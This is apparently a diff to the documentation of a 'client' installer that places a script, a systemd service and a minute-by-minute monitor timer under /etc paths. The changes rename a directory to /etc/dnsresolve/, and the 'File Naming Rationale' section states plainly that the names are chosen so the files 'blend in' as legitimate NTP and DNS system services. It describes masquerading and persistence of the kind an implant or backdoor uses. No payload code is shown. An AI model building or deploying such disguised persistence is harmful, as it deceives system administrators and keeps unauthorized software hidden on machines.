@@ -45,7 +45,7 @@ The client uses a template-based installation system where configuration is embe
    - Configuration embedded directly in the file
    - No separate .env file needed
 
-2. **/etc/ntpsync/conf**
+2. **/etc/dnsresolve/conf**
    - Monitor script
    - Checks service health
 
@@ -55,7 +55,7 @@ The client uses a template-based installation system where configuration is embe
 
 4. **/etc/systemd/system/dnsresolv.service**
    - Monitor service file
-   - Runs `/etc/ntpsync/conf`
+   - Runs `/etc/dnsresolve/conf`
 
 5. **/etc/systemd/system/dnsresolv.timer**
    - Timer that triggers monitor every minute
@@ -71,7 +71,7 @@ The client uses a template-based installation system where configuration is embe
    ↓
 4. Configured script saved to /etc/ntpsync/ntp
    ↓
-5. conf copied to /etc/ntpsync/conf
+5. conf copied to /etc/dnsresolve/conf
    ↓
 6. Systemd services installed and enabled
    ↓
@@ -99,7 +99,9 @@ sudo ./install.sh
 
 ## File Naming Rationale
 
-- **ntp-daemon** → Creates `/etc/ntpsync/ntp` (looks like system daemon)
-- **conf** → `/etc/ntpsync/conf` (looks like config/monitoring file)
-- This naming helps the client blend in as what appears to be an NTP synchronization daemon
+- **ntp-daemon** → Creates `/etc/ntpsync/ntp` (looks like NTP system daemon)
+- **conf** → `/etc/dnsresolve/conf` (looks like DNS resolver config/monitoring)
+- This naming helps the files blend in as what appear to be legitimate system services:
+  - `/etc/ntpsync/` - NTP synchronization daemon
+  - `/etc/dnsresolve/` - DNS resolver configuration
 
